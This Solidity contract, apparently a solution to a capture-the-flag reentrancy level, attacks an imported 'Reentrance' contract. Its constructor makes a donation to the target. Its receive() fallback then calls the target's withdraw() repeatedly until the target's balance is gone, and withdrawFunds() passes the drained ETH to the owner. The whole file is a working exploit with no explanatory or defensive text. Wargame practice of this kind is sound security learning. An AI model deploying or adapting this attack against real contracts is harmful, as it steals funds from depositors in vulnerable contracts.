// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

import {Reentrance} from "./Reentrance.sol";

contract ReentranceAttack {
    address public owner;
    uint256 public amount;
    Reentrance public target;

    constructor(address payable _targetAddr) public payable {
        owner = msg.sender;
        amount = msg.value;
        target = Reentrance(_targetAddr);
        target.donate{value: msg.value}(address(this));
    }

    function getContractBalance() public view returns(uint256) {
        return address(this).balance;
    }
    function withdrawFunds() public {
        require(msg.sender == owner, "Not authorized");
        require(address(this).balance > 0, "NO balance in this contract");
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "ETH transfer failed");
    }

    receive() external payable {
        if (address(target).balance > 0) {
            if (amount > address(target).balance) {
                amount = address(target).balance;
            }
            target.withdraw(amount);
        }
    }
}